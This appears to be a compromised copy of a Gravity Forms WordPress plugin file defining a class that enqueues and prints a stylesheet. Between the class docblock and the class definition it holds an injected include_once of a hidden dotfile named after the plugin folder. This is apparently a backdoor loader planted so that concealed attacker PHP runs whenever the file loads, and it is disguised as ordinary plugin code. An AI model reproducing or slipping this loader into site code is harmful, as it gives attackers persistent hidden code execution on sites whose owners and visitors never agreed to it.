<?php
/**
 * Gravity Forms Style Asset
 *
 * @since 2.5
 * @package gravityforms
 */

if ( ! class_exists( 'GFForms' ) ) {
	die();
}

/**
 * Class GF_Style_Asset
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GF_Style_Asset extends GF_Asset {

	/**
	 * Enqueue the asset.
	 *
	 * @since 2.5
	 *
	 * @return void
	 */
	public function enqueue_asset() {
		wp_enqueue_style( $this->handle, $this->url );
	}

	/**
	 * Print the asset.
	 *
	 * @since 2.5
	 *
	 * @return void
	 */
	public function print_asset() {
		$this->enqueue_asset();
		wp_print_styles( $this->handle );
	}
}